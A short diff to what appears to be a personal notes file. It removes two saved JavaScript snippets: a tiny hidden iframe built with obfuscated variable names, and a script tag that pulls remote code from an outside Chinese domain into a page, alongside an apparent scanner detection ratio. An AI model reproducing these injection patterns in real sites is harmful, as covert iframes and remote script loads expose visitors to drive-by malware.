@@ -83,25 +83,4 @@ line 2725
 Slides:http://www.robots.ox.ac.uk/seminars/Extra/2015_07_06_AndrejKarpathy.pdf
 3) state-transition probability  
 
-===========
-var idafhai = "iframe";
-var ukqre = document.createElement(idafhai);
-var utukl = "";
-ukqre.style.width = "12px";
-ukqre.style.height = "5px";
-ukqre.style.border = "0px";
-ukqre.frameBorder = "0";
-ukqre.setAttribute("frameBorder", "0");
-document.body.appendChild(ukqre);
-utukl = "https://www.w3schools.com/";
-ukqre.src = utukl;
 
-==========
-var jsFile = document.createElement("script");   ^M
-jsFile.setAttribute("type", "text/javascript");   ^M
-jsFile.setAttribute("src", "http://www.jiehun.cn/batch.panel.php?random="+Math.random());   ^M
-document.getElementById('user_status_div').appendChild(jsFile);
-
-^M -> new line signal for vim
-jiehun.cn
-Detection ratio: 3/66
